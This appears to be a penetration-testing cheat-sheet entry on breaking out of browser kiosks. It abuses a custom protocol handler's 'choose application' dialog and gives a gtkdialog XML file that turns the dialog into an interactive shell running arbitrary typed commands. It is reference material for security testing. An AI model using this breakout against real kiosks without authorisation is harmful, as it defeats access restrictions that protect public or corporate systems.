# Kiosk Breakout

### Custom Protocol in Browser Kiosk

Try protocols like irc:/ in the address bar to get a "choose application" dialog where we can escape from.

#### Interactive Shell from Firefox via Custom Protocol

```markup
<window>
    <vbox>
        <vbox scrollable="true" width="600" height="400">
            <edit>
                <variable>CMDOUTPUT</variable>
                <input file>/tmp/cmdout.txt</input>
            </edit>
        </vbox>
        <hbox>
            <text><label>Command:</label></text>
            <entry><variable>CMDTORUN</variable></entry>
            <button>
                <label>Run!</label>
                <action>$CMDTORUN > /tmp/cmdout.txt</action>
                <action>refresh:CMDOUTPUT</action>
            </button>
        </hbox>
    </vbox>
</window>
```

Create via Scratchpad, save as shell and run via `irc://host -f /home/user/shell`. This will open a "choose application" dialog \(see point above\) and we can choose gtkdialog to execute it.

